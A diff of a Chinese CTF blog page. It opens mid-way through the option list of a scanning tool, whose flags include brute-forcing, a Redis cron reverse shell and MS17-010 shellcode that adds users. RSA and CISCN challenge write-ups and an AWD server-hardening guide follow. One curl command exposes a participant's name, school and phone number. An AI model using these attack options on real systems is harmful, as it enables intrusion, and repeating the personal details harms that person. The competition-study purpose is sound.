指定web poc的模糊名字, -pocname weblogic</span><br><span class="line">-proxy string</span><br><span class="line">      设置代理, -proxy http://127.0.0.1:8080</span><br><span class="line">-user string</span><br><span class="line">      指定爆破时的用户名</span><br><span class="line">-userf string</span><br><span class="line">      指定爆破时的用户名文件</span><br><span class="line">-<span class="built_in">pwd</span> string</span><br><span class="line">      指定爆破时的密码</span><br><span class="line">-pwdf string</span><br><span class="line">      指定爆破时的密码文件</span><br><span class="line">-rf string</span><br><span class="line">      指定redis写公钥用模块的文件 (as: -rf id_rsa.pub)</span><br><span class="line">-rs string</span><br><span class="line">      redis计划任务反弹shell的ip端口 (as: -rs 192.168.1.1:6666)</span><br><span class="line">-silent</span><br><span class="line">      静默扫描,适合cs扫描时不回显</span><br><span class="line">-sshkey string</span><br><span class="line">      ssh连接时,指定ssh私钥</span><br><span class="line">-t int</span><br><span class="line">      扫描线程 (default 600)</span><br><span class="line">-time int</span><br><span class="line">      端口扫描超时时间 (default 3)</span><br><span class="line">-u string</span><br><span class="line">      指定Url扫描</span><br><span class="line">-uf string</span><br><span class="line">      指定Url文件扫描</span><br><span class="line">-wt int</span><br><span class="line">      web访问超时时间 (default 5)</span><br><span class="line">-pocpath string</span><br><span class="line">      指定poc路径</span><br><span class="line">-usera string</span><br><span class="line">      在原有用户字典基础上,新增新用户</span><br><span class="line">-pwda string</span><br><span class="line">      在原有密码字典基础上,增加新密码</span><br><span class="line">-socks5</span><br><span class="line">      指定socks5代理 (as: -socks5  socks5://127.0.0.1:1080)</span><br><span class="line">-sc </span><br><span class="line">      指定ms17010利用模块shellcode,内置添加用户等功能 (as: -sc add)</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-Crypto方向wp" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2023/06/01/Crypto%E6%96%B9%E5%90%91wp/" class="article-date">
+  	<time datetime="2023-06-01T03:08:58.211Z" itemprop="datePublished">2023-06-01</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Crypto方向wp"><a href="#Crypto方向wp" class="headerlink" title="Crypto方向wp"></a>Crypto方向wp</h1><h2 id="Cry1"><a href="#Cry1" class="headerlink" title="Cry1"></a>Cry1</h2><p>​	<img src="C:/Users/SharkChili/Desktop/Clip_20230519_114116.png" alt="Clip_20230519_114116"></p>
+<p>p和q是相邻的两个素数，所以对n开方就能得到p,q的中间值，next_prime(),就能的到因数。</p>
+<p>由于n比较大，所以在线分解网站是分解不出来的</p>
+<p>yafu可以分解出来</p>
+<p>RSA的流程不多说</p>
+<h2 id="Cry2"><a href="#Cry2" class="headerlink" title="Cry2"></a>Cry2</h2><p><img src="C:/Users/SharkChili/Desktop/Clip_20230519_114652.png" alt="Clip_20230519_114652"></p>
+<p>这里有一个三元一次方程组，解出来可以就得到p,q,r。给的比较简单，能直接手搓出来</p>
+<p>知道p,q,r后还要求phi根据欧拉函数的拓展能求出来。</p>
+<p>然后就是RSA了</p>
+<p>这里演示一下用Z3库解</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long,getPrime,long_to_bytes,inverse,GCD</span><br><span class="line">x1= ......</span><br><span class="line">x2= ......</span><br><span class="line">x3= ......</span><br><span class="line"><span class="comment">#定义变量</span></span><br><span class="line">p=Int(<span class="string">&quot;p&quot;</span>)</span><br><span class="line">q=Int(<span class="string">&quot;q&quot;</span>)</span><br><span class="line">r=Int(<span class="string">&quot;r&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#定义方程</span></span><br><span class="line">s=Solver()</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加约束条件</span></span><br><span class="line">s.add(x1==p+<span class="number">3</span>*q+<span class="number">2</span>*r)</span><br><span class="line">s.add(x2==<span class="number">5</span>*p+<span class="number">4</span>*q+r)</span><br><span class="line">s.add(x3==<span class="number">2</span>*p+q+<span class="number">9</span>*r)</span><br><span class="line"></span><br><span class="line"><span class="comment">#检查是否有解</span></span><br><span class="line">s.check()</span><br><span class="line"></span><br><span class="line"><span class="comment">#求解</span></span><br><span class="line">m=s.model()</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(m)</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line"><span class="comment">#将其他形式的数据转换成int</span></span><br><span class="line">pp=m.evaluate(p).as_long()</span><br><span class="line">qq=m.evaluate(q).as_long()</span><br><span class="line">rr=m.evaluate(r).as_long()</span><br><span class="line"></span><br><span class="line">n = ......</span><br><span class="line">c = ......</span><br><span class="line"></span><br><span class="line">phi=(pp-<span class="number">1</span>)*(qq-<span class="number">1</span>)*(rr-<span class="number">1</span>)*qq*qq</span><br><span class="line"><span class="built_in">print</span>(phi)</span><br><span class="line"><span class="built_in">print</span>(GCD(e,phi))</span><br><span class="line">d=inverse(e,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
+
+<p>sympy库</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> symbols,Eq, solve</span><br><span class="line"></span><br><span class="line">p, q, r = symbols(<span class="string">&#x27;p, q, r&#x27;</span>)</span><br><span class="line">eq1 = Eq(p+<span class="number">3</span>*q+<span class="number">2</span>*r, x1)</span><br><span class="line">eq2 = Eq(<span class="number">5</span>*p+<span class="number">4</span>*q+r, x2)</span><br><span class="line">eq3 = Eq(<span class="number">2</span>*p+q+<span class="number">9</span>*r, x3)</span><br><span class="line"><span class="comment"># print(solve((eq1, eq2, eq3), (p, q, r)))</span></span><br><span class="line">dict1 = solve((eq1, eq2, eq3), (p, q, r)) <span class="comment"># 得到的是字典</span></span><br><span class="line">p = dict1[p]</span><br><span class="line"><span class="comment"># print(p)</span></span><br><span class="line">q=dict1[q]</span><br><span class="line">r=dict1[r]</span><br></pre></td></tr></table></figure>
+
+
+
+<p>sage也可以做。具体用法不是很难，这里不再举例</p>
+<h2 id="cry3"><a href="#cry3" class="headerlink" title="cry3"></a>cry3</h2><p>加了好多迷惑人的，就是一道简单的rsa</p>
+<h2 id="cry4"><a href="#cry4" class="headerlink" title="cry4"></a>cry4</h2>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-CISCN" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2023/06/01/CISCN/" class="article-date">
+  	<time datetime="2023-06-01T03:08:58.210Z" itemprop="datePublished">2023-06-01</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="CISCN"><a href="#CISCN" class="headerlink" title="CISCN"></a>CISCN</h1><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="27日-签到卡"><a href="#27日-签到卡" class="headerlink" title="27日_签到卡"></a>27日_签到卡</h3><p>输入print(open(‘&#x2F;flag’).read())直接出</p>
+<h3 id="27日-被加密的生产流量"><a href="#27日-被加密的生产流量" class="headerlink" title="27日_被加密的生产流量"></a>27日_被加密的生产流量</h3><p>追踪tcp流</p>
+<p><img src="https://gaoxudong.top/wp-content/uploads/2023/05/Clip_20230528_175756.png" alt="QQ截图20230527231429"></p>
+<p>中间那串是base32</p>
+<p><img src="https://gaoxudong.top/wp-content/uploads/2023/05/QQ%E6%88%AA%E5%9B%BE20230527231611.jpg" alt="QQ截图20230527231611"></p>
+<h3 id="27日-国粹"><a href="#27日-国粹" class="headerlink" title="27日_国粹"></a>27日_国粹</h3><p>真想来几句国粹</p>
+<p>附件的第三张图片是维吉尼亚的表的一部分，a是纵坐标，k是横纵坐标，标点得到flag，问gpt搞了个脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="comment">#表</span></span><br><span class="line"><span class="comment"># 打开图片</span></span><br><span class="line">im1 = Image.<span class="built_in">open</span>(<span class="string">&quot;ccc.png&quot;</span>)</span><br><span class="line"><span class="comment"># 获取图片大小</span></span><br><span class="line">width1, height1 = im1.size</span><br><span class="line"></span><br><span class="line">top = <span class="number">0</span></span><br><span class="line">bottom = height1 / <span class="number">2</span></span><br><span class="line"></span><br><span class="line">wid = <span class="number">53</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(width1//wid):</span><br><span class="line">    left = i*wid+<span class="number">1</span></span><br><span class="line">    right=(i+<span class="number">1</span>)*wid</span><br><span class="line">    test=im1.crop((left, top, right, bottom))</span><br><span class="line">    test.save(<span class="string">&quot;./test/&#123;&#125;.png&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">im2 = Image.<span class="built_in">open</span>(<span class="string">&quot;a.png&quot;</span>)</span><br><span class="line"><span class="comment"># 获取图片大小</span></span><br><span class="line">width2, height2 = im2.size</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(width2//wid):</span><br><span class="line">    left = i*wid+<span class="number">1</span></span><br><span class="line">    right=(i+<span class="number">1</span>)*wid</span><br><span class="line">    test=im2.crop((left, top, right, bottom))</span><br><span class="line">    test.save(<span class="string">&quot;./a/&#123;&#125;.png&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">im3 = Image.<span class="built_in">open</span>(<span class="string">&quot;k.png&quot;</span>)</span><br><span class="line"><span class="comment"># 获取图片大小</span></span><br><span class="line">width3, height3 = im3.size</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(width3//wid):</span><br><span class="line">    left = i*wid+<span class="number">1</span></span><br><span class="line">    right=(i+<span class="number">1</span>)*wid</span><br><span class="line">    test=im3.crop((left, top, right, bottom))</span><br><span class="line">    test.save(<span class="string">&quot;./k/&#123;&#125;.png&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">judge</span>(<span class="params">path1,path2</span>):</span><br><span class="line">    <span class="comment"># 读取图片</span></span><br><span class="line">    img1 = cv2.imread(path1)</span><br><span class="line">    img2 = cv2.imread(path2)</span><br><span class="line">    <span class="comment"># 将图片调整为8*8大小</span></span><br><span class="line">    img1 = cv2.resize(img1, (<span class="number">8</span>, <span class="number">8</span>))</span><br><span class="line">    img2 = cv2.resize(img2, (<span class="number">8</span>, <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 转化为灰度图</span></span><br><span class="line">    gray1 = cv2.cvtColor(img1, cv2.COLOR_BGR2GRAY)</span><br><span class="line">    gray2 = cv2.cvtColor(img2, cv2.COLOR_BGR2GRAY)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算均值</span></span><br><span class="line">    avg1 = np.mean(gray1)</span><br><span class="line">    avg2 = np.mean(gray2)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算哈希值</span></span><br><span class="line">    hash1 = (gray1 &gt; avg1).reshape(<span class="number">1</span>, -<span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line">    hash2 = (gray2 &gt; avg2).reshape(<span class="number">1</span>, -<span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算相似度</span></span><br><span class="line">    similarity = <span class="number">1</span> - np.mean(hash1 != hash2)</span><br><span class="line">    <span class="keyword">return</span>  similarity</span><br><span class="line"></span><br><span class="line">xy=<span class="built_in">open</span>(<span class="string">&#x27;xy.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">x=[]</span><br><span class="line">y=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">341</span>)):</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>):</span><br><span class="line">        imga=<span class="string">&#x27;./a/&#123;&#125;.png&#x27;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        imgc=<span class="string">&#x27;./test/&#123;&#125;.png&#x27;</span>.<span class="built_in">format</span>(a)</span><br><span class="line">        <span class="keyword">if</span> judge(imga,imgc)==<span class="number">1.0</span>:</span><br><span class="line">            y.append(-a)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>):</span><br><span class="line">        imgk=<span class="string">&#x27;./k/&#123;&#125;.png&#x27;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        imgc=<span class="string">&#x27;./test/&#123;&#125;.png&#x27;</span>.<span class="built_in">format</span>(k)</span><br><span class="line">        <span class="keyword">if</span> judge(imgk,imgc)==<span class="number">1.0</span>:</span><br><span class="line">            x.append(k)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># print(&#x27;(&#123;&#125;,&#123;&#125;)&#x27;.format(x,y))</span></span><br><span class="line">    <span class="comment"># xy.write(&#x27;&#123;&#125; &#123;&#125;\n&#x27;.format(x,y))</span></span><br><span class="line">fig = plt.figure()</span><br><span class="line">ax1 = fig.add_subplot(<span class="number">111</span>)</span><br><span class="line">ax1.set_title(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">ax1.scatter(x, y, c=<span class="string">&#x27;b&#x27;</span>, marker=<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line"><span class="comment"># plt.show()</span></span><br><span class="line">plt.savefig(<span class="string">&#x27;flag.png&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gaoxudong.top/wp-content/uploads/2023/05/flag.png" alt="flag"></p>
+<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="27日-基于国密SM2算法的密钥分发"><a href="#27日-基于国密SM2算法的密钥分发" class="headerlink" title="27日_基于国密SM2算法的密钥分发"></a>27日_基于国密SM2算法的密钥分发</h3><p>写这个wp的时候环境已经没了，不知道明天会不会开放</p>
+<p>大概写一下思路</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#登录获取id</span></span><br><span class="line">curl -d <span class="string">&quot;name=%E9%AB%98%E6%97%AD%E4%B8%9C&amp;school=%E6%AD%A6%E6%B1%89%E7%A7%91%E6%8A%80%E5%A4%A7%E5%AD%A6&amp;phone=18293814176&quot;</span> http://123.56.244.196:30629/api/login</span><br><span class="line"></span><br><span class="line"><span class="comment">#传公钥</span></span><br><span class="line">curl -d <span class="string">&quot;id=471acaa5-4651-42d9-8a8f-4a466f256019&amp;publicKey=8EF998E54661B98AFE90D483892C79738622C381A9D40BEF3E02752AF4B62CAB4399AEFE38968412A5870B7CC72459FDBE22B0ED6A5C569BE283D43695B9E8E5&quot;</span> http://123.56.244.196:30629/api/allkey</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
+<p>这里有一个非预期，随便给服务器传一个quantumString，然后访问&#x2F;api&#x2F;search，就会看到quantumStringSever，复制这一串再提交一次，就会显示验证通过，直接得到flag</p>
+<p>没保存截图，直接看一下history</p>
+<p><img src="https://gaoxudong.top/wp-content/uploads/2023/05/QQ%E6%88%AA%E5%9B%BE20230527234546.jpg" alt="QQ截图20230527234546"></p>
+<h3 id="27日-Sign-in-passwd"><a href="#27日-Sign-in-passwd" class="headerlink" title="27日_Sign_in_passwd"></a>27日_Sign_in_passwd</h3><p>base换表</p>
+<p><img src="https://gaoxudong.top/wp-content/uploads/2023/05/QQ%E6%88%AA%E5%9B%BE20230527234700.jpg" alt="QQ截图20230527234700"></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-awd" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2023/06/01/awd/" class="article-date">
+  	<time datetime="2023-06-01T03:08:58.208Z" itemprop="datePublished">2023-06-01</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="awd"><a href="#awd" class="headerlink" title="awd"></a>awd</h1><h2 id="加固阶段"><a href="#加固阶段" class="headerlink" title="加固阶段"></a>加固阶段</h2><h3 id="用ssh登录的服务器"><a href="#用ssh登录的服务器" class="headerlink" title="用ssh登录的服务器"></a>用ssh登录的服务器</h3><p>通常是<code>Finallshell</code>或者<code>XShell+Sxfpt</code></p>
+<p>登录之后修改ssh的登录密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">passwd</span><br><span class="line"><span class="comment">#先输入旧密码，再输入两次新密码</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="打包备份网站目录"><a href="#打包备份网站目录" class="headerlink" title="打包备份网站目录"></a>打包备份网站目录</h3><p>一般是&#x2F;var&#x2F;www&#x2F;html&#x2F;目录，但是在www目录下没有执行的权限，如果执行打包命令会失败，所以我们进入html目录下面进行打包</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zcvf 4.tar.gz *</span><br></pre></td></tr></table></figure>
+
+<h3 id="修改数据库密码"><a href="#修改数据库密码" class="headerlink" title="修改数据库密码"></a>修改数据库密码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql -u xxx -p xxxx   <span class="comment">#进入数据库</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> PASSWORD = password(‘123456’); <span class="comment">#修改密码</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="备份数据库"><a href="#备份数据库" class="headerlink" title="备份数据库"></a>备份数据库</h3><ul>
+<li>备份指定的多个数据库</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -u xxx -p xxx --databases DB1 DB2 &gt; /tmp/db.sql</span><br></pre></td></tr></table></figure>
+
+<p>无 lock tables 权限的解决方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -u xxx -p xxx --all-databases --skip-lock-tables &gt; /tmp/db.sql</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>恢复备份（在 MySQL 终端下执行）</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source FILE_PATH</span><br></pre></td></tr></table></figure>
+
+<h3 id="D盾扫目录"><a href="#D盾扫目录" class="headerlink" title="D盾扫目录"></a>D盾扫目录</h3><p>将打包好的文件拖出来，放到D盾里面去扫，拖出来的过程有点慢，这时候可以上<strong>weblogger</strong>了</p>
+<h3 id="上weblogger"><a href="#上weblogger" class="headerlink" title="上weblogger"></a>上weblogger</h3><p>weblogger是进行流量监控，</p>
+<ol>
+<li><p>将weblogger拖到html目录下</p>
+</li>
+<li><p>给weblogger 777的权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 777 -R weblogger</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在浏览器打开weblogger下的install.php文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url+/weblogger/install.php</span><br></pre></td></tr></table></figure>
+
+<p>输入一系列东西之后如果成功会出现如下界面</p>
+<p><img src="https://gaoxudong.top/wp-content/uploads/2023/04/weblogger.jpg" alt="weblogger"></p>
+<p><strong>记住这两行的内容</strong></p>
+<p>第一行是需要包含到文件中的路径</p>
+<p>第二行是welogger的登录地址</p>
+</li>
+<li><p>添加文件包含到index.php文件里面</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&#x27;xxx&#x27;</span> ; </span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span> <span class="string">&#x27;xxx&#x27;</span>; <span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#xxx为绝对路径或者相对路径</span></span><br><span class="line">    </span><br><span class="line">改 .user.ini配置文件 auto_prepend_file=; </span><br><span class="line">包含在文件头auto_append_file=; 包含在文件尾</span><br></pre></td></tr></table></figure>
+
+<p>这里不一定只包含到index.php中，具体情况具体分析</p>
+</li>
+<li><p>登录weblogger查看流量</p>
+<p>靶机地址后面拼接第二行的内容</p>
+<p><img src="https://gaoxudong.top/wp-content/uploads/2023/04/weblogger-1.jpg" alt="weblogger-1"></p>
+<p>登录刚才输入的账号密码，然后就可以查看流量监控</p>
+</li>
+</ol>
+<p><strong>如果weblogger忘了给权限，就换一个浏览器从第二步重新开始</strong></p>
+<p>换一个浏览器</p>
+<p>换一个浏览器</p>
+<p>换一个浏览器</p>
+<h3 id="上waf"><a href="#上waf" class="headerlink" title="上waf"></a>上waf</h3><p>waf有被check的风险，所以我个人的想法就是不上waf。</p>
+<p>上waf方法比较简单，与weblogger是相同的</p>
+<p>传waf到一个路径，然后包含到index或者其他路径里面就行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&#x27;waf.php&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>有一个很有用的waf叫<code>warchbird</code>，我们不使用他的waf功能，只是借助<code>watchbird</code>来进行流量分析</p>
+<ol>
+<li><p>将watchbird中的<code>waf.so</code>和<code>watchbird.php</code>文件都传到html目录下面</p>
+</li>
+<li><p>给两个文件777权限</p>
+</li>
+<li><p>在目录下面执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php watchbird.php --install /var/www/html</span><br></pre></td></tr></table></figure>
+
+<p>这时，所有php文件都会包含<code>watchbird</code></p>
+</li>
+<li><p>登录<code>watchbird</code></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?watchbird=ui</span><br></pre></td></tr></table></figure>
+
+<p>登录之后要设置密码，<strong>密码不要设置弱口令，一定要加几个符号</strong></p>
+<p>设置之后再登录就好</p>
+</li>
+<li><p>关闭<code>watchbird</code>里面的waf</p>
+<p>不关指定没好果汁吃</p>
+</li>
+</ol>
+<p><img src="https://gaoxudong.top/wp-content/uploads/2023/04/QQ%E6%88%AA%E5%9B%BE20230411174327.jpg" alt="QQ截图20230411174327"></p>
+<p>然后再日志里面就可以看流量了</p>
+<p><img src="https://gaoxudong.top/wp-content/uploads/2023/04/QQ%E6%88%AA%E5%9B%BE20230411174556.jpg" alt="QQ截图20230411174556"></p>
+<p>流量重放很好用，可以根据别人的方法来反打</p>
+<p><strong>这里流量日志没有过滤ip的选项，所以结合weblogger使用</strong></p>
+<h3 id="上传文件监控"><a href="#上传文件监控" class="headerlink" title="上传文件监控"></a>上传文件监控</h3><p>在上面都做完后，审出来的洞都修复以后，再上文件监控</p>
+<p>文件监控会自动识别并恢复被删除的文件或者删除新上传的文件</p>
+<ol>
+<li><p>上传文件到html目录下面</p>
+</li>
+<li><p>给777权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> u+x jiankong</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>执行脚本</p>
+<p><strong>在执行文件监控的时候建议再开一个ssh窗口，因为该进程会一直占用shell</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./jiankong</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gaoxudong.top/wp-content/uploads/2023/04/QQ%E6%88%AA%E5%9B%BE20230411181102.jpg" alt="QQ截图20230411181102"></p>
+<p>监控位置一般是&#x2F;var&#x2F;www&#x2F;html</p>
+<p>备份位置选择&#x2F;tmp</p>
+</li>
+</ol>
